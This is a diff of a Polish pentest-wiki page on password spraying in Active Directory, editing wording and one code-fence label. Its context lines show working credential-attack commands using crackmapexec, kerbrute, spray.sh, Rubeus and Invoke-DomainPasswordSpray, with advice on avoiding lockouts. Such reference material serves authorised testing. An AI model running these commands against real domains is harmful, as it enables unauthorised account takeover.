@@ -5,7 +5,7 @@
 
 ## **Password Spraying**
 
-Gdy znajdziesz kilka **ważnych nazw użytkowników**, możesz spróbować najczęstszych **haseł** (pamiętaj o polityce haseł w danym środowisku) dla każdego z odkrytych użytkowników.\
+Gdy znajdziesz kilka **ważnych nazw użytkowników**, możesz spróbować najczęściej występujących **haseł** (pamiętaj o polityce haseł w danym środowisku) dla każdego z odkrytych użytkowników.\
 Zgodnie z **domyślnymi ustawieniami** **minimalna** **długość** **hasła** wynosi **7**.
 
 Listy popularnych nazw użytkowników mogą być również przydatne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
@@ -47,11 +47,11 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-- [**spray**](https://github.com/Greenwolf/Spray) _**(możesz wskazać liczbę prób, aby uniknąć zablokowania konta):**_
+- [**spray**](https://github.com/Greenwolf/Spray) _**(możesz wskazać liczbę prób, aby uniknąć zablokowania):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- Używając [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIEZALECANE, CZASAMI NIE DZIAŁA
+- Używanie [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIEZALECANE, CZASAMI NIE DZIAŁA
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
@@ -78,7 +78,7 @@ done
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
 - Z [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Może domyślnie generować użytkowników z domeny i pobiera politykę haseł z domeny oraz ograniczać próby zgodnie z nią):
-```powershell
+```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 - Z [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
